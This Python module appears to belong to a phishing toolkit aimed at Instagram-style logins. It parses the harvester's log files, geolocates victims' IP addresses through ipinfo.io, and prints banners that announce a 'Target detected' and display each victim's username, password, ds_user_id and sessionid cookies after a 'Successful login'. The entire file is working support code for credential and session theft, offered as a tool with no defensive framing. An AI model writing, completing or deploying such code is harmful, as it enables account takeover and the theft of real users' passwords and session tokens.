import requests
import json
from colorama import Fore, Back, Style

def capture_information(filename, n):
    with open(filename, 'r') as f:
        lines = f.readlines()
    last_lines = lines[-n:]
    filtered_lines =  [line for line in last_lines if line.strip()]
    filtered_lines_str = ""
    for line in filtered_lines:
        if "Username" in line:
            filtered_lines_str += "--------------------------------------\n"
        filtered_lines_str += line 
    filtered_lines_str += "--------------------------------------"
    return filtered_lines_str


def get_location(ip_address):
    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
    data = response.json()
    return data

def set_agent():
    file_path = 'output/ip_agent.log'
    with open(file_path, 'r') as file:
        lines = file.readlines()
    last_line = lines[-1:]
    user_agent =  last_line[0].split(": ", 1)[1]

    return user_agent


def edit_cookies(cookies):
    cookies = json.loads(cookies)
    new_cookies =  f"\nds_user_id: {cookies['ds_user_id']}\nsessionid:  {cookies['sessionid']}"
    return new_cookies


def first_art(visit_time, user_ip, user_agent):
    user_agent = user_agent.strip()
    message = f"""{Style.BRIGHT}{Fore.YELLOW}
            Target detected!!
 --------------------------------------------
|Enter website in: {Fore.GREEN}{visit_time}                                               
{Fore.YELLOW} --------------------------------------------
|IP:~~~~~~~~~~~~~~ {Fore.GREEN}{user_ip}                                                              
{Fore.YELLOW} --------------------------------------------
|User-Agent:~~~~~~ {Fore.GREEN}{user_agent}
{Fore.YELLOW}---------------------------------------------"""
    print(message)


def correct_answer(username,password,cookies):
    cookies = cookies.strip().split()
    message = f"""{Style.BRIGHT}{Fore.GREEN}
            Successful login
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.GREEN}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.GREEN}{password}                                                              
{Fore.YELLOW} --------------------------------------------
| ds_user_id: {Fore.GREEN}{cookies[1]}                                                          
{Fore.YELLOW}---------------------------------------------
| sessionid:  {Fore.GREEN}{cookies[3]}
{Fore.YELLOW}---------------------------------------------"""
    print(message)


def wrong_answer(username,password):
    message = f"""{Style.BRIGHT}{Fore.RED}
            Username or Password wrong
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.RED}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.RED}{password}                                                              
{Fore.YELLOW} --------------------------------------------"""
    print(message)
